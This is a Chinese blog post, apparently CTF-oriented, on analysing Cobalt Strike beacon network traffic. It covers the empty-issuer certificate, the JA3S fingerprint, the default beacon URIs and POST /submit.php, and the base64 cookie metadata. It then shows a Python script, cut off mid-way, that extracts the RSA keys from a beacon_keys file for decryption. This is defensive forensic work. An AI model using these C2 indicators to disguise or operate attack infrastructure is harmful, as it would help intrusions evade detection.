<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="*CobalStrike流量-beacon模式*">
<meta property="og:type" content="article">
<meta property="og:title" content="常见webshell流量分析">
<meta property="og:url" content="http://example.com/2023/10/05/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="*CobalStrike流量-beacon模式*">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fd92a91dd-c461-4862-b933-a889162eb6aa%2FUntitled.png?table=block&id=c8ebcb38-ed3a-4ee1-9e29-95f02b4e1f8d&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=2000&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F1767b69e-0646-477b-9bc6-c783182da651%2FUntitled.png?table=block&id=aaea125a-c2c7-4cef-8322-90badb736772&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=2000&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F24ea3a34-bc17-4a9e-b15d-21e0cf5dda8b%2FUntitled.png?table=block&id=73080a83-be90-499d-9d87-22f76f3f76aa&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fd4b93fb1-de2a-4e2b-92fd-9637047c7e47%2FUntitled.png?table=block&id=bfa93849-f7d8-4b35-ab43-e65003e458a2&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F10f30ce4-1993-45bf-8fd6-06097494aa3c%2FUntitled.png?table=block&id=a152709b-06be-4fb1-a578-22f00d2d38dc&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F1ec473c5-2141-4f5a-988c-b117693c8ef1%2FUntitled.png?table=block&id=d895f23d-a7e5-43ef-b65d-913ed24e7545&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1120&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F937083a3-f15f-4fd6-8552-fc1207d3b145%2FUntitled.png?table=block&id=62302837-201f-4a65-bbb6-29858590c7cb&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fe1dcc772-54c8-4dbd-b34f-443fc200f34f%2FUntitled.png?table=block&id=cd090950-559c-46ee-9604-7df151ff3b6b&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F4b3a7eb5-f0ec-4afa-b332-f395a28ee58c%2FUntitled.png?table=block&id=c316761d-4937-435c-90b4-b8e602df8870&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F60a400c3-e3f4-4934-a07a-c0d6a4712a02%2FUntitled.png?table=block&id=68e23719-0ebc-43ee-a2ba-9ebd9674e0e3&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F50273e62-b5fd-4f32-8d7c-e5c00cf50f86%2FUntitled.png?table=block&id=f42b275e-3cac-4668-83b8-6149a5755736&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F95db1fa9-9e88-4830-ab2c-7c8e9ceb0f47%2FUntitled.png?table=block&id=faa554d7-4983-4772-b4f0-f98ebe343a3b&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F0aee8829-ccad-47be-9f8e-58429066aae6%2FUntitled.png?table=block&id=aeab7193-4621-4e52-b081-da3f929a55b5&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F0e5b26199268430be82c4542843c1fb0.png?table=block&id=6c3c8f30-2826-449d-938f-58f475764632&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fe1283605-d817-48f5-8ac9-1c258196c298%2FUntitled.png?table=block&id=2e9c199c-a39b-43e3-9438-4e7b88462bf3&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F85e0781e4aad48e35360d55b8d1406e3.png?table=block&id=6e8dbb07-d4e8-4344-968d-0812be0510d4&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F9e363a8bf7f09d3398dd36a72d3a96c7.png?table=block&id=0bc22119-354e-48d7-b86c-24b396116e3c&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F0cc3d0fc929f0afa19c1b73c2f982090.png?table=block&id=b6832c56-1202-45f6-b4f1-70af6cf3bf56&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F46cc7fae-9bff-4d30-ad01-339d51e037d4%2FUntitled.png?table=block&id=dc0a698e-2ed2-43fb-8e44-d1902f980a08&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F24e2a15b-2c78-4b47-b760-38c89273d1e8%2FUntitled.png?table=block&id=0c05b147-dfdb-4d57-aa71-336873b9a2e2&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fded92381-1946-449e-a8d6-be7e9dcad4a4%2FUntitled.png?table=block&id=f99bcd16-6490-42d1-ac97-f1a72ca318ae&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F68ef9e59-3271-407f-bb73-dd817d941b59%2FUntitled.png?table=block&id=b09f2978-8090-42dd-86ed-fce6d5bdd35e&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F68ebf5ef-1652-48c8-aaf5-c18381b11835%2FUntitled.png?table=block&id=c900c72a-7d5f-4cf8-ab71-080ef4865f2b&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F2d4726ca-6495-410c-b6c9-5d8037c7de9b%2FUntitled.png?table=block&id=2513f432-4c14-4972-8f4a-05381dddbfde&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F10dff611-92fd-4b98-9615-c83914621e27%2FUntitled.png?table=block&id=f29bdec9-b577-4c9d-a73b-1d1f82538c59&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F3fe904f6-e46f-41b1-b35e-6b34c5175578%2FUntitled.png?table=block&id=7a659a52-b422-411e-8984-d126b64a9dd8&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F126ea814-a85d-44b1-9dde-354a6830a816%2FUntitled.png?table=block&id=b43ce739-6685-42de-9f99-5d99e9571eda&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fb55a61fd-005f-4e2a-9fe7-bfdc2260ecaf%2FUntitled.png?table=block&id=69757526-b9a3-41dd-a877-4cd7036d1baa&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F75304c73-ca91-44e9-9ea4-f4734b7efb71%2FUntitled.png?table=block&id=472d9c31-35b0-4f01-a705-ef67e0d91507&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2Fd9e4f31e911a8955406d2583bdca42e5.png?table=block&id=0b95bd4d-17b7-48f3-bb38-bee66b80788c&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F0186d32e84788b16db611c79033ea485.png?table=block&id=430c91f1-4e30-463a-8c20-46a96a52d33a&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fbc335720-eac8-47b1-9906-1a02c0238077%2FUntitled.png?table=block&id=7968e414-932e-421b-afa7-d709f041a352&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1110&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F6366132d-320a-4e4a-890e-6aa6443e8700%2FUntitled.png?table=block&id=b25367d3-90ad-46d6-b343-76469fa6ca0b&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fd4b28442-8cf5-4caf-a22f-ddb0d7f0aaf0%2FUntitled.png?table=block&id=686815fb-c6a3-4701-94c6-ee75de9fd60f&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F0aaced4f-8de3-4eba-a0f3-eefd8db6b54e%2FUntitled.png?table=block&id=0d27e5c8-dd81-4d79-89ef-c46ce6677e5b&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1410&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fcfdce14c-1909-46d4-af25-b2683e7de8fb%2FUntitled.png?table=block&id=8e7585ff-a007-441e-885d-bc9f3a1d3eef&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1360&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F48a84a26-3b70-4790-be77-ea4d19aa9c6b%2FUntitled.png?table=block&id=6c95afc7-71e5-4033-a81c-b53d2f748a4c&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="og:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F1ba28d89-3df0-404a-9929-2affaceba736%2FUntitled.png?table=block&id=f5d4552d-9f61-43ad-9b58-117b0997de6e&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2">
<meta property="article:published_time" content="2023-10-05T03:12:20.000Z">
<meta property="article:modified_time" content="2025-05-25T03:32:32.965Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fd92a91dd-c461-4862-b933-a889162eb6aa%2FUntitled.png?table=block&id=c8ebcb38-ed3a-4ee1-9e29-95f02b4e1f8d&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=2000&userId=&cache=v2">

<link rel="canonical" href="http://example.com/2023/10/05/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>常见webshell流量分析 | Hexo</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Hexo</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/05/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          常见webshell流量分析
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-05 11:12:20" itemprop="dateCreated datePublished" datetime="2023-10-05T11:12:20+08:00">2023-10-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-05-25 11:32:32" itemprop="dateModified" datetime="2025-05-25T11:32:32+08:00">2025-05-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="CobalStrike流量-beacon模式"><a href="#CobalStrike流量-beacon模式" class="headerlink" title="*CobalStrike流量-beacon模式*"></a><em><strong>*CobalStrike流量-beacon模式*</strong></em></h2><span id="more"></span>

<h3 id="流量特征（一些普遍但不绝对的特征）"><a href="#流量特征（一些普遍但不绝对的特征）" class="headerlink" title="流量特征（一些普遍但不绝对的特征）"></a>流量特征（一些普遍但不绝对的特征）</h3><p>https-beacon通信中，cs默认使用空证书建立加密通道，流量中可以看见这一过程。</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fd92a91dd-c461-4862-b933-a889162eb6aa%2FUntitled.png?table=block&id=c8ebcb38-ed3a-4ee1-9e29-95f02b4e1f8d&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=2000&userId=&cache=v2" alt="Untitled"></p>
<p>issuer指发行者，此处为空</p>
<p>同时在 https 协议的 Client Hello 和 Server Hello 阶段，都包含了 JA3S 值传输过程过程中会有 ja3，这个值在系统上是固定的，win10是一种的，但win11是另一种，他们取决于操作系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;JA3S&quot; 是一种基于 SSL/TLS 握手参数的指纹识别技术。它用于识别和分类网络通信中使用的 SSL/TLS 客户端密码套件，可以帮助检测和阻止恶意流量。</span><br><span class="line"></span><br><span class="line">常见的网络威胁和攻击会使用加密协议来隐藏其真实目的和敏感信息。使用 JA3S 技术可以对 SSL/TLS 通信进行分析，通过检查客户端密码套件的参数来生成一个唯一的指纹。这个指纹可以用于识别特定的客户端应用程序、恶意软件或恶意行为。</span><br><span class="line"></span><br><span class="line">JA3S 指纹是根据 SSL/TLS 握手消息中的参数生成的，这些参数包括支持的密码套件、加密算法、密钥交换算法和其他相关信息。通过比对已知的 JA3S 指纹数据库或模式，安全团队可以识别和分类不同的 SSL/TLS 客户端。</span><br><span class="line"></span><br><span class="line">使用 JA3S 技术的安全工具和系统可以帮助提高网络安全，例如用于入侵检测系统（IDS）、入侵防御系统（IPS）和网络流量分析等。它可以用来检测和阻止使用特定 SSL/TLS 版本、加密算法或密码套件的恶意流量，帮助保护网络免受恶意活动的影响。</span><br></pre></td></tr></table></figure>

<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F1767b69e-0646-477b-9bc6-c783182da651%2FUntitled.png?table=block&id=aaea125a-c2c7-4cef-8322-90badb736772&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=2000&userId=&cache=v2" alt="Untitled"></p>
<p>http-beacon通信中，默认使用get方法向<code>/dpixel</code>、<code>/__utm.gif</code>、<code>/pixel.gif</code>等地址发起请求</p>
<p>同时get读文件时cookie是一串base64的值，这是cs流量的<strong>元数据</strong>（后面解密会用）</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F24ea3a34-bc17-4a9e-b15d-21e0cf5dda8b%2FUntitled.png?table=block&id=73080a83-be90-499d-9d87-22f76f3f76aa&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>下发指令过程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /submit.php?id=一串数字</span><br></pre></td></tr></table></figure>

<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fd4b93fb1-de2a-4e2b-92fd-9637047c7e47%2FUntitled.png?table=block&id=bfa93849-f7d8-4b35-ab43-e65003e458a2&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>post一串0000开头的data，这是cs流量的<strong>发送任务数据</strong>（下面也会用到）</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F10f30ce4-1993-45bf-8fd6-06097494aa3c%2FUntitled.png?table=block&id=a152709b-06be-4fb1-a578-22f00d2d38dc&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p><strong>基于做题（不算特征）</strong>：基于ctf本身，由于cs流量解密时需要RSA公私钥对，相关信息存储着<code>.cobaltstrike.beacon_keys</code>文件内，所以题目大概率会在流量里以各种形式给出这个文件</p>
<p>这个文件的本质是一个java序列化后的字节流</p>
<p>（以下均为一起上号不这道题为例）</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F1ec473c5-2141-4f5a-988c-b117693c8ef1%2FUntitled.png?table=block&id=d895f23d-a7e5-43ef-b65d-913ed24e7545&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1120&userId=&cache=v2" alt="Untitled"></p>
<p><strong>关于流量解密</strong></p>
<ol>
<li>我们可以通过以下脚本解密key文件获取公钥和私钥</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import javaobj.v2 as javaobj</span><br><span class="line"></span><br><span class="line">with open(&quot;key&quot;, &quot;rb&quot;) as fd:</span><br><span class="line">    pobj = javaobj.load(fd)</span><br><span class="line">privateKey = pobj.array.value.privateKey.encoded.data</span><br><span class="line">publicKey = pobj.array.value.publicKey.encoded.data</span><br><span class="line"></span><br><span class="line">privateKey = (</span><br><span class="line">    b&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span><br><span class="line">    + base64.encodebytes(bytes(map(lambda x: x &amp; 0xFF, privateKey)))</span><br><span class="line">    + b&quot;-----END PRIVATE KEY-----&quot;</span><br><span class="line">)</span><br><span class="line">publicKey = (</span><br><span class="line">    b&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span><br><span class="line">    + base64.encodebytes(bytes(map(lambda x: x &amp; 0xFF, publicKey)))</span><br><span class="line">    + b&quot;-----END PUBLIC KEY-----&quot;</span><br><span class="line">)</span><br><span class="line">print(privateKey.decode())</span><br><span class="line">print(publicKey.decode())</span><br><span class="line"></span><br><span class="line"># print(</span><br><span class="line">#     list(</span><br><span class="line">#         map(</span><br><span class="line">#             lambda x: list(map(lambda y: (y[0].name, y[1]), 